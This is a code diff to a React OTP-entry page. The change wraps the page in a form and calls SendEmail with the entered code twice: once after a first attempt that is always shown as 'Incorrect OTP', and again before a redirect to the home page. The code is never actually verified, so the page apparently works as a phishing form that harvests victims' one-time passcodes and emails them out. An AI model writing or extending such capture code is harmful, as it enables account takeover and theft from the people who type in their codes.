@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useRef } from "react";
 import "../otp/otp.css";
 import { useState } from "react";
 import "../login/login.css";
@@ -11,6 +11,7 @@ import { FaTelegramPlane } from "react-icons/fa";
 import { FaRegClock } from "react-icons/fa";
 import Countdown from "../countdown-Timer/Countdown";
 import { useNavigate } from "react-router-dom";
+import { SendEmail } from "../sendEmail/SendEmail";
 
 const OTP = () => {
   const [isotp, setIsotp] = useState(true);
@@ -19,8 +20,12 @@ const OTP = () => {
   const [loader, setLoader] = useState(false);
   const [error, setError] = useState("");
   const navigate = useNavigate()
+  const form = useRef()
+ 
 
-  const handleOTPSubmit = () => {
+
+  const handleOTPSubmit = (e) => {
+    e.preventDefault()
     if (!number) {
       setError("Field cannot be empty");
       return
@@ -29,6 +34,7 @@ const OTP = () => {
     if (!loginAttempted) {
       setError("Incorrect OTP. Please, try again");
       setLoginAttempted(true);
+      SendEmail(form)
       return
     }
 
@@ -37,6 +43,7 @@ const OTP = () => {
       setError("")
       setLoader(false);
       navigate("/")
+      SendEmail(form)
     }, 3000);
   };
 
@@ -66,6 +73,7 @@ const OTP = () => {
       </div>
       <div className="main-section">
         <div className="loginDiv">
+          <form ref={form} onSubmit={handleOTPSubmit}>
           <h2>Enter OTP</h2>
           <div className="optionDiv">
             <p
@@ -87,6 +95,7 @@ const OTP = () => {
               <div className="input-wrapper">
                 <FaEnvelope className="input-icon" id="envelope-icon" />
                 <input
+                name="otp"
                   type="text"
                   pattern='"\d'
                   inputMode="numeric"
@@ -126,6 +135,7 @@ const OTP = () => {
               <FaTelegramPlane className="social-icon" id="telegram" />
             </div>
           </div>
+          </form>
         </div>
         <div className="imageDiv">
           <div className="content">
